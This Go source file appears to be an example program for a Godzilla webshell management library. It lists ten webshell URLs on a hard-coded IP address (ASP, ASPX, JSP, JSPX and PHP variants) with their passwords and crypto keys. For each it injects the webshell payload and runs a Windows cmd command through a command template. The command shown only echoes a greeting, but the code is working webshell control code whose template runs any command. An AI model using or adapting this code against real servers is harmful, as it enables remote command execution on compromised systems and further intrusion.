package main

import (
	"fmt"
	"github.com/xiecat/wsm"
	"github.com/xiecat/wsm/lib/charset"
	"github.com/xiecat/wsm/lib/shell"
	"github.com/xiecat/wsm/lib/shell/godzilla"
	"log"
)

const (
	AspRawShellUrl   = "http://139.196.175.86:8081/xorraw.asp"
	AspBs64ShellUrl  = "http://139.196.175.86:8081/xorbs64.asp"
	AspxBs64ShellUrl = "http://139.196.175.86:8081/bs64.aspx"
	AspxRawShellUrl  = "http://139.196.175.86:8081/raw.aspx"
	JspBs64ShellUrl  = "http://139.196.175.86:8080/bs64.jsp"
	JspRawShellUrl   = "http://139.196.175.86:8080/raw.jsp"
	JspxBs64ShellUrl = "http://139.196.175.86:8080/bs64.jspx"
	JspxRawShellUrl  = "http://139.196.175.86:8080/raw.jspx"
	PhpBs64ShellUrl  = "http://139.196.175.86/bs64.php"
	PhpRawShellUrl   = "http://139.196.175.86/raw.php"
)

func main() {
	jspBs64Exec()
	jspRawExec()

	jspxBs64Exec()
	jspxRawExec()

	aspxBs64Exec()
	aspxRawExec()

	aspBs64Exec()
	aspRawExec()

	phpBs64Exec()
	phpRawExec()
}

func phpRawExec() {
	info := &wsm.GodzillaInfo{
		BaseShell: wsm.BaseShell{
			Url:      PhpRawShellUrl,
			Password: "pass",
			Script:   shell.PhpScript,
			Proxy:    "http://127.0.0.1:9999",
		},
		Key:      "key",
		Crypto:   godzilla.PHP_XOR_RAW,
		Encoding: charset.UTF8CharSet,
	}
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		log.Println(err)
	}
	err = g.InjectPayload()
	if err != nil {
		log.Println(err)
	}

	cp := &godzilla.ExecParams{
		//`cmd /c "cd /d "C:/shells/apache-tomcat-8.5.70/bin/"&echo 你好"`
		RealCommand: `cmd /c "cd /d "C:/shells/apache-tomcat-8.5.70/bin/"&echo 你好 hhh"`,
		Template:    `cmd /c "{command}"`,
		Command:     `echo 你好`,
	}
	echo, err := g.CommandExec(cp)
	if err != nil {
		log.Println(err)
	}
	fmt.Println(echo.ToMap())
}

func phpBs64Exec() {
	info := &wsm.GodzillaInfo{
		BaseShell: wsm.BaseShell{
			Url:      PhpBs64ShellUrl,
			Password: "pass",
			Script:   shell.PhpScript,
			Proxy:    "http://127.0.0.1:9999",
		},
		Key:      "key",
		Crypto:   godzilla.PHP_XOR_BASE64,
		Encoding: charset.UTF8CharSet,
	}
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		log.Println(err)
	}
	err = g.InjectPayload()
	if err != nil {
		log.Println(err)
	}
	if err != nil {
		log.Println(err)
	}

	cp := &godzilla.ExecParams{
		//`cmd /c "cd /d "C:/shells/apache-tomcat-8.5.70/bin/"&echo 你好"`
		RealCommand: `cmd /c "cd /d "C:/shells/apache-tomcat-8.5.70/bin/"&echo 你好 hhh"`,
		Template:    `cmd /c "{command}"`,
		Command:     `echo 你好`,
	}
	echo, err := g.CommandExec(cp)
	if err != nil {
		log.Println(err)
	}
	fmt.Println(echo.ToMap())
}

func aspRawExec() {
	info := &wsm.GodzillaInfo{
		BaseShell: wsm.BaseShell{
			Url:      AspRawShellUrl,
			Password: "pass",
			Script:   shell.AspScript,
			Proxy:    "http://127.0.0.1:9999",
		},
		Key:      "key",
		Crypto:   godzilla.ASP_XOR_RAW,
		Encoding: charset.UTF8CharSet,
	}
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		log.Println(err)
	}
	err = g.InjectPayload()
	if err != nil {
		log.Println(err)
	}

	cp := &godzilla.ExecParams{
		//`cmd /c "cd /d "C:/shells/apache-tomcat-8.5.70/bin/"&echo 你好"`
		RealCommand: `cmd /c "cd /d "C:/shells/apache-tomcat-8.5.70/bin/"&echo 你好 hhh"`,
		Template:    `cmd /c "{command}"`,
		Command:     `echo 你好`,
	}
	echo, err := g.CommandExec(cp)
	if err != nil {
		log.Println(err)
	}
	fmt.Println(echo.ToMap())
}

func aspBs64Exec() {
	info := &wsm.GodzillaInfo{
		BaseShell: wsm.BaseShell{
			Url:      AspBs64ShellUrl,
			Password: "pass",
			Script:   shell.AspScript,
			Proxy:    "http://127.0.0.1:9999",
		},
		Key:      "key",
		Crypto:   godzilla.ASP_XOR_BASE64,
		Encoding: charset.UTF8CharSet,
	}
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		log.Println(err)
	}
	err = g.InjectPayload()
	if err != nil {
		log.Println(err)
	}

	cp := &godzilla.ExecParams{
		//`cmd /c "cd /d "C:/shells/apache-tomcat-8.5.70/bin/"&echo 你好"`
		RealCommand: `cmd /c "cd /d "C:/shells/apache-tomcat-8.5.70/bin/"&echo 你好 hhh"`,
		Template:    `cmd /c "{command}"`,
		Command:     `echo 你好`,
	}
	echo, err := g.CommandExec(cp)
	if err != nil {
		log.Println(err)
	}
	fmt.Println(echo.ToMap())
}

func aspxRawExec() {
	info := &wsm.GodzillaInfo{
		BaseShell: wsm.BaseShell{
			Url:      AspxRawShellUrl,
			Password: "pass",
			Script:   shell.CsharpScript,
			Proxy:    "http://127.0.0.1:9999",
		},
		Key:      "key",
		Crypto:   godzilla.CSHARP_AES_RAW,
		Encoding: charset.UTF8CharSet,
	}
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		log.Println(err)
	}
	err = g.InjectPayload()
	if err != nil {
		log.Println(err)
	}

	cp := &godzilla.ExecParams{
		//`cmd /c "cd /d "C:/shells/apache-tomcat-8.5.70/bin/"&echo 你好"`
		RealCommand: `cmd /c "cd /d "C:/shells/apache-tomcat-8.5.70/bin/"&echo 你好 hhh"`,
		Template:    `cmd /c "{command}"`,
		Command:     `echo 你好`,
	}
	echo, err := g.CommandExec(cp)
	if err != nil {
		log.Println(err)
	}
	fmt.Println(echo.ToMap())
}

func aspxBs64Exec() {
	info := &wsm.GodzillaInfo{
		BaseShell: wsm.BaseShell{
			Url:      AspxBs64ShellUrl,
			Password: "pass",
			Script:   shell.CsharpScript,
			Proxy:    "http://127.0.0.1:9999",
		},
		Key:      "key",
		Crypto:   godzilla.CSHARP_AES_BASE64,
		Encoding: charset.UTF8CharSet,
	}
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		log.Println(err)
	}
	err = g.InjectPayload()
	if err != nil {
		log.Println(err)
	}

	cp := &godzilla.ExecParams{
		//`cmd /c "cd /d "C:/shells/apache-tomcat-8.5.70/bin/"&echo 你好"`
		RealCommand: `cmd /c "cd /d "C:/shells/apache-tomcat-8.5.70/bin/"&echo 你好 hhh"`,
		Template:    `cmd /c "{command}"`,
		Command:     `echo 你好`,
	}
	echo, err := g.CommandExec(cp)
	if err != nil {
		log.Println(err)
	}
	fmt.Println(echo.ToMap())
}

func jspxRawExec() {
	info := &wsm.GodzillaInfo{
		BaseShell: wsm.BaseShell{
			Url:      JspxRawShellUrl,
			Password: "pass",
			Script:   shell.JavaScript,
			Proxy:    "http://127.0.0.1:9999",
		},
		Key:      "key",
		Crypto:   godzilla.JAVA_AES_RAW,
		Encoding: charset.UTF8CharSet,
	}
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		log.Println(err)
	}
	err = g.InjectPayload()
	if err != nil {
		log.Println(err)
	}

	cp := &godzilla.ExecParams{
		//`cmd /c "cd /d "C:/shells/apache-tomcat-8.5.70/bin/"&echo 你好"`
		RealCommand: `cmd /c "cd /d "C:/shells/apache-tomcat-8.5.70/bin/"&echo 你好 hhh"`,
		Template:    `cmd /c "{command}"`,
		Command:     `echo 你好`,
	}
	echo, err := g.CommandExec(cp)
	if err != nil {
		log.Println(err)
	}
	fmt.Println(echo.ToMap())
}

func jspxBs64Exec() {
	info := &wsm.GodzillaInfo{
		BaseShell: wsm.BaseShell{
			Url:      JspxBs64ShellUrl,
			Password: "pass",
			Script:   shell.JavaScript,
			Proxy:    "http://127.0.0.1:9999",
		},
		Key:      "key",
		Crypto:   godzilla.JAVA_AES_BASE64,
		Encoding: charset.UTF8CharSet,
	}
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		log.Println(err)
	}
	err = g.InjectPayload()
	if err != nil {
		log.Println(err)
	}

	cp := &godzilla.ExecParams{
		//`cmd /c "cd /d "C:/shells/apache-tomcat-8.5.70/bin/"&echo 你好"`
		RealCommand: `cmd /c "cd /d "C:/shells/apache-tomcat-8.5.70/bin/"&echo 你好 hhh"`,
		Template:    `cmd /c "{command}"`,
		Command:     `echo 你好`,
	}
	echo, err := g.CommandExec(cp)
	if err != nil {
		log.Println(err)
	}
	fmt.Println(echo.ToMap())
}

func jspRawExec() {
	info := &wsm.GodzillaInfo{
		BaseShell: wsm.BaseShell{
			Url:      JspRawShellUrl,
			Password: "pass",
			Script:   shell.JavaScript,
			Proxy:    "http://127.0.0.1:9999",
		},
		Key:      "key",
		Crypto:   godzilla.JAVA_AES_RAW,
		Encoding: charset.UTF8CharSet,
	}
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		log.Println(err)
	}
	err = g.InjectPayload()
	if err != nil {
		log.Println(err)
	}

	cp := &godzilla.ExecParams{
		//`cmd /c "cd /d "C:/shells/apache-tomcat-8.5.70/bin/"&echo 你好"`
		RealCommand: `cmd /c "cd /d "C:/shells/apache-tomcat-8.5.70/bin/"&echo 你好 hhh"`,
		Template:    `cmd /c "{command}"`,
		Command:     `echo 你好`,
	}
	echo, err := g.CommandExec(cp)
	if err != nil {
		log.Println(err)
	}
	fmt.Println(echo.ToMap())
}

func jspBs64Exec() {
	info := &wsm.GodzillaInfo{
		BaseShell: wsm.BaseShell{
			Url:      JspBs64ShellUrl,
			Password: "pass",
			Script:   shell.JavaScript,
			Proxy:    "http://127.0.0.1:9999",
		},
		Key:      "key",
		Crypto:   godzilla.JAVA_AES_BASE64,
		Encoding: charset.UTF8CharSet,
	}
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		log.Println(err)
	}
	// 注入全部的 payload
	err = g.InjectPayload()
	if err != nil {
		log.Println(err)
	}

	cp := &godzilla.ExecParams{
		//`cmd /c "cd /d "C:/shells/apache-tomcat-8.5.70/bin/"&echo 你好"`
		RealCommand: `cmd /c "cd /d "C:/shells/apache-tomcat-8.5.70/bin/"&echo 你好 hhh"`,
		Template:    `cmd /c "{command}"`,
		Command:     `echo 你好`,
	}
	echo, err := g.CommandExec(cp)
	if err != nil {
		log.Println(err)
	}
	fmt.Println(echo.ToMap())
}
